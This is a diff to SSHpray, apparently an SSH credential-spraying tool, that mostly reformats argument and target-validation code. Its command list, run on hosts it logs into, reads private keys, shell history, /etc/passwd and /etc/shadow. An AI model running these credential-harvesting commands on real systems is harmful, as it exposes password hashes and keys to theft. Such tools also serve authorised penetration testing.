@@ -41,13 +41,17 @@ class SSHpray():
         self.loot_dir = './loot/'
         if not os.path.exists(self.loot_dir):
             os.makedirs(self.loot_dir)
-        #command(s) to run
-        self.remote_commands = ['sudo locate id_rsa','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last','exit']
+        #command(s) to run. assumes bash, this is probably a stupid assumption
+        self.remote_commands = ['sudo locate id_rsa',\
+        'tail -n 50 ~/.bash_history', 'cat /etc/passwd;',\
+        'sudo cat /etc/shadow;','uname -a;','w;','who -a;','last;','exit']
 
 
+    #attempts to validate user supplied args
     def check_args(self, parser):
         #print version and supplied args if verbose
-        if self.args.verbose is True: print('[i] Version: {}\n[i] Options: {}'.format(self.version,parser.parse_args()))
+        if self.args.verbose is True: print(\
+            '[i] Version: {}\n[i] Options: {}'.format(self.version,parser.parse_args()))
 
         #require at least one argument to provide targets
         if not (self.args.targets or self.args.ipaddress):
@@ -59,11 +63,12 @@ class SSHpray():
         if self.args.targets is not None:
             print('[i] Opening targets file: {}'.format(self.args.targets))
             self.targets_file = self.args.targets
-            #call read_targets function
+            #call read_targets function which will check if the file lines are valid
             self.read_targets()
         
         #if ip address isnt blank
-        if self.args.ipaddress is not None: self.target_set.add(''.join(self.args.ipaddress))
+        if self.args.ipaddress is not None: 
+            self.target_set.add(''.join(self.args.ipaddress))
 
         if self.args.username is None:
             self.user_name = os.getlogin()
@@ -110,7 +115,7 @@ class SSHpray():
         if not ipAddrRegex.match(t):
             #remove from targetList
             if self.args.verbose is True:print('[v] Removing invalid IP {}'% t)
-            self.target_list.remove(t)
+            self.target_set.remove(t)
         else:
             #otherwise add to target set
             self.target_set.add(t)
